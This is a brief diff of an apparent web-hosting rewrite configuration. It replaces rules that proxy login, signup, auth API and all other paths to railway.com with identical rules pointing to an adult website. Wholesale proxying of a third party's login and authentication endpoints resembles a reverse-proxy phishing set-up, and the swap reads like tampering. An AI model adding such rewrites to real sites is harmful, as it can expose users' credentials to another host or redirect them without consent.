@@ -1,8 +1,8 @@
 {
   "rewrites": [
-    { "source": "/login/:path*", "destination": "https://railway.com/login/:path*" },
-    { "source": "/signup/:path*", "destination": "https://railway.com/signup/:path*" },
-    { "source": "/api/auth/:path*", "destination": "https://railway.com/api/auth/:path*" },
-    { "source": "/(.*)", "destination": "https://railway.com/$1" }
+    { "source": "/login/:path*", "destination": "https://pornhub.com/login/:path*" },
+    { "source": "/signup/:path*", "destination": "https://pornhub.com/signup/:path*" },
+    { "source": "/api/auth/:path*", "destination": "https://pornhub.com/api/auth/:path*" },
+    { "source": "/(.*)", "destination": "https://pornhub.com/$1" }
   ]
 }
